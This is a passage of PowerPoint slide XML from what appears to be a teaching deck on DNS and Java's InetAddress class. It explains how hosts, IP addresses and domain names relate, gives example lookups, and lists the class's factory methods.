            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>this IP address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>During this process, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>address is completely transparent to the user. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>If a domain name corresponds to multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>addresses, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>randomly selects one IP from these multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP addresses.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1905000" y="228600"/>
            <a:ext cx="7427033" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Domain Name System ( DNS )</a:t>
            </a:r>
            <a:endParaRPr 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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436562" y="1295400"/>
            <a:ext cx="11374438" cy="4498975"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>System ( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>links </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>210.39.3.164 &lt;-&gt; www.szu.edu.cn</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>elation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>A host may have multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>One </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>address may be pointed to by multiple domain names</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>A domain name may point to multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1905000" y="228600"/>
            <a:ext cx="7427033" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Domain Name System ( DNS )</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
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="266700" y="843677"/>
            <a:ext cx="11658600" cy="2616101"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. A Host May Have Multiple IP Addresses: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A single host (server or device) can be assigned multiple IP addresses. This is common for redundancy (failover), load balancing, or serving different network interfaces (IPv4 and IPv6).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Domain: example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP Addresses: 192.0.2.1 (IPv4) and 2001:db8::1 (IPv6)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>When you query example.com, the DNS may return both IP addresses, and the client (browser) will choose the appropriate one (e.g., IPv6 if supported).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3718679"/>
            <a:ext cx="11387668" cy="3170099"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. One IP Address May Be Pointed to by Multiple Domain Names: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A single server (with one IP) can host multiple websites, each with its own domain name. This is common in shared hosting or virtual hosting.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP Address: 203.0.113.45</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Domains:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>site1.com → 203.0.113.45</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>site2.com → 203.0.113.45</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>When you access either domain, the request goes to the same server, which then serves the correct website based on the Host header in HTTP.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1905000" y="135791"/>
            <a:ext cx="7427033" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Domain Name System ( DNS )</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
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1120676"/>
            <a:ext cx="10972800" cy="2339102"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. A Domain Name May Point to Multiple IP Addresses: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A single domain can resolve to multiple IPs for load balancing (distributing traffic) or redundancy (failover in case one server fails).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Example: Domain: google.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP Addresses: 172.217.0.1     172.217.0.2      172.217.0.3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>When you query google.com, DNS may return multiple IPs in a shuffled order (Round Robin DNS), distributing requests across different servers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1905000" y="228600"/>
            <a:ext cx="7427033" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Domain Name System ( DNS )</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="Table 6"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="381000" y="4205057"/>
          <a:ext cx="11388724" cy="1894176"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3433620"/>
                <a:gridCol w="4567380"/>
                <a:gridCol w="3387724"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Concept</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Example</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Purpose</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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a:effectLst/>
                        </a:rPr>
                        <a:t>One host, multiple IPs</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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example.com → 192.0.2.1 &amp; 2001:db8::1</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IPv4 + IPv6 support</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dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>One IP, multiple domains</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US"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a:effectLst/>
                        </a:rPr>
                        <a:t>site1.com &amp; site2.com → 203.0.113.45</a:t>
                      </a:r>
                      <a:endParaRPr lang="pt-BR">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Shared hosting</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dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>One domain, multiple IPs</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US"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google.com → 172.217.0.1, 172.217.0.2, etc.</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effectLst/>
                        </a:rPr>
                        <a:t>Load balancing &amp; redundancy</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="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9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="3578717"/>
            <a:ext cx="2055371" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Summary</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1" y="228600"/>
            <a:ext cx="12039600" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class and Application Programming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402166" y="1752600"/>
            <a:ext cx="11387667" cy="3697288"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Master object creation via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(), and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>getAllByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Compare DNS-based vs. raw IP initialization.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can resolve hostnames to IPs and vice versa, handling exceptions like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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266700" y="1066800"/>
            <a:ext cx="11696700" cy="5486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t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t> class in Java is part of the java.net package and represents an IP address (either IPv4 or IPv6). </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>It provides methods to perform DNS lookups, convert between hostnames and IP addresses, and check address properties.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Key Features of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Represents both IPv4 and IPv6 addresses.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Does not have a public constructor (use static factory methods).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Supports hostname resolution (forward and reverse DNS lookups).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Standard DNS: example.com → 192.0.2.1 (A/AAAA record).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Reverse DNS: 192.0.2.1 → example.com (PTR record).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Immutable (once created, cannot be modified).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="304800"/>
            <a:ext cx="4660250" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Class</a:t>
            </a:r>
            <a:endParaRPr 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pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId1"/>
          <a:srcRect t="41333"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="914400"/>
            <a:ext cx="7391400" cy="3352800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7924800" y="1001215"/>
            <a:ext cx="4038600" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Factory Methods: Static, used for object creation, Creates and returns new object instances (often hiding complex initialization).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7924800" y="2794406"/>
